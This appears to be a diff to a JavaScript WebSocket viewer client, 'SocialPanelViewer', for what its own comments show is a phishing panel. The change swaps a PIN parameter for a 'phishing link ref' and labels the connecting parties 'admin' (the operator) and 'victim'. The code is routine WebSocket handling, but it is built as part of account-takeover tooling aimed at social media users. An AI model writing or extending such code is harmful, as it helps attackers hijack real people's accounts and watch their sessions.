@@ -1,7 +1,8 @@
 // Vanilla viewer client. No framework, no build step.
 //
 //   const v = new SocialPanelViewer(canvasEl);
-//   v.connect('facebook', pin);
+//   v.connect('accountId');           // admin (uses session cookie)
+//   v.connect('accountId', ref);      // victim (ref = phishing link ref)
 //   v.disconnect();
 
 class SocialPanelViewer {
@@ -16,12 +17,12 @@ class SocialPanelViewer {
     this._rafId = null;
   }
 
-  connect(accountId, pin) {
+  connect(accountId, ref) {
     this.disconnect();
     const proto    = location.protocol === 'https:' ? 'wss' : 'ws';
-    const pinParam = pin ? `?pin=${encodeURIComponent(pin)}` : '';
+    const refParam = ref ? `?ref=${encodeURIComponent(ref)}` : '';
     const ws = new WebSocket(
-      `${proto}://${location.host}/api/accounts/${encodeURIComponent(accountId)}/viewer${pinParam}`
+      `${proto}://${location.host}/api/accounts/${encodeURIComponent(accountId)}/viewer${refParam}`
     );
     this.ws = ws;
 
